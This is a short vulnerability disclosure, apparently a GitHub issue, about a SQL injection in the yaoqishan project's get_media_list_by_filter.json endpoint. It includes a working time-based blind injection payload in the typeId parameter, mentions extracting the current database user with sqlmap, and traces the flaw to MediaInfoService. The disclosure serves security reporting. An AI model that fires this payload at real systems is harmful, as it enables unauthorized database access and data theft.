SQL injection vulnerability exists in yaoqishan master

yaoqishan系统get_media_list_by_filter.json接口存在SQL注入

The get_media_list_by_filter.json interface of the yaoqishan has SQL injection vulnerability.

github: https://github.com/user-xiangpeng/yaoqishan

Affected version: master

releases：https://github.com/user-xiangpeng/yaoqishan/archive/refs/heads/master.zip

Payload:
```
 http://192.168.8.136:8080/api/get_media_list_by_filter.json?typeId=1' AND (SELECT 7689 FROM (SELECT(SLEEP(5)))sgUi) AND 'CwMf'='CwMf&filterArr=1&pageNum=1&pageSize=100
```
Use sqlmap for verification, and retrieve all the current_user.
使用sqlmap验证，跑出当前用户：

![image](https://github.com/user-attachments/assets/a8388211-4342-4d07-a778-2e91cf18b68f)

The getMediaLisByFilter interface in ApiAction calls the listByFilter method from MediaInfoService to query sysFile.

![image](https://github.com/user-attachments/assets/4269b215-5013-4655-afa0-3321e4d60cc8)

![image](https://github.com/user-attachments/assets/ad1b4af0-0c1d-4ccd-952b-bf547e262309)

cn/javaex/yaoqishan/service/media_info/MediaInfoService.java
